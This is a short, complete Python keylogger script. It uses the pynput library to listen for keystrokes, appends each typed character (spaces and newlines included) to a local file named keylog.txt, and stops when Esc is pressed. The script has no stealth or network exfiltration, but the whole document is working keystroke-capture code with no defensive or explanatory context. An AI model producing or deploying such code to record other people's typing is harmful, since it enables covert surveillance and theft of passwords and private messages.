from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys
        with open("keylog.txt", "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()